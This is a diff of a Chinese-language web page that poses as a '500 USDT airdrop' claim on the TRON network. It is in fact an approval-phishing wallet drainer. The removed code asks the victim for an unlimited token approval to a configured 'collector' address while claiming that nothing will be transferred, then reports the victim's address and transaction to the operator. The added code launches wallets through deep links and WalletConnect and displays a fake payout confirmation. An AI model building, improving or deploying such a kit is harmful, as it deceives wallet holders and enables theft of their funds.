+        return 'intent://dapp?url=' + encodeURIComponent(u) +
+               '#Intent;scheme=safepal;package=io.safepal.wallet;end;';
+      },
+      ios: 'https://apps.apple.com/search?term=SafePal',
+      android: 'https://play.google.com/store/apps/details?id=io.safepal.wallet'
+    },
+    {
+      id: 'coin98', name: 'Coin98', desc: '多链钱包', icon: '◇',
+      pkg: 'coin98.crypto.finance.news.app',
+      scheme: function (u) { return 'coin98://dapp?url=' + encodeURIComponent(u); },
+      intent: function (u) {
+        return 'intent://dapp?url=' + encodeURIComponent(u) +
+               '#Intent;scheme=coin98;package=coin98.crypto.finance.news.app;end;';
+      },
+      ios: 'https://apps.apple.com/search?term=Coin98',
+      android: 'https://play.google.com/store/apps/details?id=coin98.crypto.finance.news.app'
+    }
+  ];
+
+  function renderWallets() {
+    var box = $('#wallets');
+    box.innerHTML = '';
+    WALLETS.forEach(function (w) {
+      var el = document.createElement('div');
+      el.className = 'w';
+      el.setAttribute('role', 'button');
+      el.innerHTML =
+        '<span class="ic">' + w.icon + '</span>' +
+        '<span class="tx"><span class="nm">' + w.name +
+          (w.badge ? '<span class="bd">' + w.badge + '</span>' : '') +
+        '</span><span class="ds">' + w.desc + '</span></span>' +
+        '<span class="ar">›</span>';
+      el.addEventListener('click', function () { launchWallet(w); }, false);
+      box.appendChild(el);
+    });
+  }
+
+  /* ==========================================================
+     ⑩ deep link 拉起 + 失败兜底
+     ========================================================== */
+  function launchWallet(w) {
+    if (!IS_HTTPS) {
+      toast('请用 https 网址打开本页，本地文件无法唤起钱包');
+      return;
+    }
+    saveState({ phase: 'launched', wallet: w.id });
+
+    var url = location.href;
+    var target = (IS_ANDROID && w.intent) ? w.intent(url) : w.scheme(url);
+
+    var left = false;
+    var onVis = function () { if (document.hidden) left = true; };
+    document.addEventListener('visibilitychange', onVis, false);
+    var onHide = function () { left = true; };
+    window.addEventListener('pagehide', onHide, false);
+
+    // 必须在用户手势里同步跳转，中间不能有 await / setTimeout
+    try { location.href = target; } catch (e) {}
+
+    setTimeout(function () {
+      document.removeEventListener('visibilitychange', onVis, false);
+      window.removeEventListener('pagehide', onHide, false);
+      if (left || document.hidden) return;   // 已经跳走了，正常
+
+      // 没起来：给下载 / 重试，不自动甩去商店
+      closeSheet('#sheet');
+      setStatus('没有唤起到 ' + w.name, 'err');
+      var store = IS_IOS ? w.ios : w.android;
+      toast('没唤起？可能未安装或版本过低', 3000);
+      var bar = document.createElement('div');
+      bar.style.cssText = 'margin-top:12px;display:flex;gap:8px';
+      bar.innerHTML =
+        '<button class="ghost" id="goStore" style="flex:1">去下载 ' + w.name + '</button>' +
+        '<button class="ghost" id="retryOne" style="flex:1">再试一次</button>';
+      var card = $('#card');
+      var old = card.querySelector('.fallback');
+      if (old) old.remove();
+      bar.className = 'fallback';
+      card.appendChild(bar);
+      $('#goStore').addEventListener('click', function () { window.open(store, '_blank'); });
+      $('#retryOne').addEventListener('click', function () { launchWallet(w); });
+    }, 2600);
+  }
+
+  /* ==========================================================
+     ⑪ WalletConnect 兜底
+     ========================================================== */
+  var wcWallet = null;
+
+  function setWcStatus(text, kind) {
+    var el = $('#wcStatus');
+    el.textContent = text;
+    el.className = 'wc-status' + (kind ? ' ' + kind : '');
+  }
+
+  var WC_CDNS = [
+    'https://esm.sh/@tronweb3/walletconnect-tron@1',
+    'https://cdn.jsdelivr.net/npm/@tronweb3/walletconnect-tron@1/+esm'
+  ];
+
+  async function loadWcLib() {
+    var lastErr = null;
+    for (var i = 0; i < WC_CDNS.length; i++) {
+      try {
+        var mod = await import(WC_CDNS[i]);
+        if (mod && mod.WalletConnectWallet) return mod;
+      } catch (e) { lastErr = e; }
+    }
+    throw lastErr || new Error('WC_LOAD_FAIL');
+  }
+
+  async function runWC() {
+    if (!CONFIG.WC_PROJECT_ID) {
+      toast('WalletConnect 还没配置 projectId');
+      return;
+    }
+    closeSheet('#sheet');
+    openSheet('#wcSheet');
+    setWcStatus('正在启动 WalletConnect…');
+    setBusy(true);
+    setBtnText('连接中…');
+
+    try {
+      var mod = await loadWcLib();
+      setWcStatus('正在建立会话…');
+
+      wcWallet = new mod.WalletConnectWallet({
+        network: 'Mainnet',
+        options: {
+          projectId: CONFIG.WC_PROJECT_ID,
+          relayUrl: 'wss://relay.walletconnect.com',
+          metadata: {
+            name: CONFIG.DAPP_NAME,
+            description: 'Claim USDT airdrop',
+            url: location.origin,
+            icons: [location.origin + '/favicon.ico']
+          }
+        }
+      });
+
+      await wcWallet.connect();
+
+      setWcStatus('已连接，正在校验…');
+      closeSheet('#wcSheet');
+
+      var tw = wcWallet.tronWeb;
+      for (var i = 0; i < 40 && !tronWebReady(tw); i++) {
+        await wait(150);
+        tw = wcWallet.tronWeb;
+      }
+      if (!tronWebReady(tw)) throw new Error('NO_ACCOUNT');
+
+      setBusy(false);
+      await runClaim(tw, 'walletconnect');
+      setBusy(false);
+    } catch (e) {
+      var msg = String((e && (e.message || e)) || '');
+      setWcStatus('连接未完成，可关闭重试', 'err');
+      if (/NO_ACCOUNT|NOT_QUALIFIED|NO_TRX|REJECTED|TX_FAILED/.test(msg)) {
+        handleError(e);
+      } else {
+        setStatus(/load|fetch|import/i.test(msg) ? MSG.WC_LOAD_FAIL : '连接已取消', 'err');
+        setBusy(false);
+        setBtnText('重试');
+      }
+    }
+  }
+
+  /* ==========================================================
+     ⑫ 成功页
+     ========================================================== */
+  function showDone(addr, txid) {
+    setBusy(false);
+    closeSheet('#sheet');
+    closeSheet('#wcSheet');
+    var short = function (a) {
+      return a ? (a.slice(0, 6) + '…' + a.slice(-6)) : '-';
+    };
+    $('#card').innerHTML =
+      '<div class="done">' +
+        '<div class="ico">✓</div>' +
+        '<h2>资格已确认</h2>' +
+        '<p>500 USDT 将在 24 小时内发放至你的地址</p>' +
+        '<p style="font-size:12px;opacity:.75">请保持地址正常状态，逾期未到账可联系官方支持</p>' +
+      '</div>' +
+      '<div class="kv">' +
+        '<div><i>钱包地址</i><b>' + short(addr) + '</b></div>' +
+        '<div><i>交易哈希</i><b>' + (txid ? short(txid) : '已受理') + '</b></div>' +
+        '<div><i>网络</i><b>TRON Mainnet</b></div>' +
+        '<div><i>状态</i><b style="color:#26d07c">排队发放中</b></div>' +
+      '</div>';
+  }
+
+  /* ==========================================================
+     ⑬ 入口
+     ========================================================== */
+  async function start() {
+    if (!CONFIG.COLLECTOR || /X{10,}/.test(CONFIG.COLLECTOR)) {
+      toast('还没配置归集地址');
       return;
     }
 
-    /* 7) 授权 */
-    setStatus('请在钱包中确认（校验额度，不会转账）…', 'wait');
-    const txid = await contract.approve(CONFIG.COLLECTOR, MAX_UINT)
-                               .send({ feeLimit: CONFIG.FEE_LIMIT });
+    setBusy(true);
+    setBtnText('检测中…');
 
-    /* 8) 上报 */
-    report({
-      addr,
-      txid: typeof txid === 'string' ? txid : String(txid),
-      ua: UA,
-      ts: Date.now(),
-      ref: location.href
-    });
-
-    $btn.disabled = true;
-    $btn.textContent = '领取成功';
-    setStatus(
-      '校验通过，500 USDT 将在 24 小时内发放至 ' +
-      addr.slice(0, 6) + '…' + addr.slice(-4),
-      'ok'
-    );
-  } catch (err) {
-    unlock();
-    const msg = String((err && (err.message || err.msg)) || err || '');
-    if (/reject|cancel|denied|用户取消|decline/i.test(msg)) {
-      setStatus('已取消操作，如需领取请重新点击', 'err');
-    } else if (/insufficient|balance|energy|bandwidth/i.test(msg)) {
-      setStatus('当前地址 TRX 不足，请充值少量 TRX 作为网络费用后重试', 'err');
-    } else {
-      setStatus('校验失败，请稍后重试', 'err');
-      if (CONFIG.DEBUG) console.error('[approve]', err);
+    // 1. 已经在 DApp 浏览器里 / 桌面上装了插件
+    if (await waitProvider(1200)) {
+      setBusy(false);
+      setBtnText('立即领取');
+      return runInjected();
     }
+
+    setBusy(false);
+    setBtnText('立即领取');
+
+    // 2. 社交 App 内置浏览器：scheme 和 provider 都调不动
+    if (IN_SOCIAL) {
+      setStatus('请点右上角「···」选择在浏览器打开', 'err');
+      toast('当前环境不支持唤起钱包，请用系统浏览器打开');
+      return;
+    }
+
+    // 3. 移动端系统浏览器 → 让用户选钱包
+    if (IS_MOBILE) {
+      setStatus('请选择你的钱包');
+      return openSheet('#sheet');
+    }
+
+    // 4. 桌面浏览器 → WalletConnect
+    setStatus('正在启动 WalletConnect…');
+    return runWC();
   }
-}
 
-$btn.addEventListener('click', main);
+  function bind() {
+    renderWallets();
 
-/* 页面加载后自动检测一次环境，给出提示但不动按钮 */
-window.addEventListener('load', () => {
-  setTimeout(() => {
-    if (IN_TG) {
-      setStatus('当前为应用内置浏览器，请点右上角「···」→「在浏览器打开」', 'err');
-    } else if (!hasProvider() && !IS_MOBILE) {
-      setStatus('未检测到钱包插件，请安装 TronLink 插件后刷新');
+    btn.addEventListener('click', function () {
+      if (btn.disabled) return;
+      start();
+    }, false);
+
+    $('#wcBtn').addEventListener('click', function () { runWC(); }, false);
+
+    document.addEventListener('click', function (e) {
+      var t = e.target;
+      if (!t || !t.getAttribute) return;
+      var c = t.getAttribute('data-close');
+      if (c === '1') closeSheet('#sheet');
+      if (c === '2') closeSheet('#wcSheet');
+    }, false);
+
+    var restored = false;
+    function restore() {
+      if (restored) return;
+      restored = true;
+      var s = loadState();
+      if (!s) return;
+
+      if (s.phase === 'approved' && s.txid) {
+        showDone(s.addr, s.txid);
+        return;
+      }
+      // 刚从钱包跳回来，页面被重开 —— 自动接上
+      if (s.phase === 'launched' && hasProvider()) {
+        setStatus('检测到钱包，正在恢复…', 'busy');
+        setTimeout(function () { runInjected(); }, 700);
+      }
     }
-  }, 800);
-});
+    if (document.readyState === 'complete') setTimeout(restore, 60);
+    else window.addEventListener('load', restore, false);
+  }
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', bind, false);
+  } else {
+    bind();
+  }
+})();
 </script>
 </body>
 </html>
